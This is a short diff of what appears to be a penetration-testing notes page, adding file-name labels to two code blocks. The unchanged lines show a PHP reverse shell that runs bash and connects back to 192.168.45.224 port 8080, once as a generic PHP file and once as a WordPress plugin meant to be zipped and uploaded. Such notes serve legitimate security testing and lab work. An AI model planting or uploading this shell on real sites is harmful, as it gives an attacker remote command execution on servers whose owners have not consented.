@@ -16,6 +16,7 @@ A generic PHP reverse shell where you can/should swap out the listening IP addre
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
 ?>
 ```
+{: file='~/naughty.php'}
 
 ### WordPress
 
@@ -34,6 +35,7 @@ For a WordPress plugin, you need to add a bit more info for it to load as a "val
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
 ?>
 ```
+{: file='~/naughty-wp-plugin.php'}
 
 Zip that PHP file, then upload the zipped file as a plugin.
 
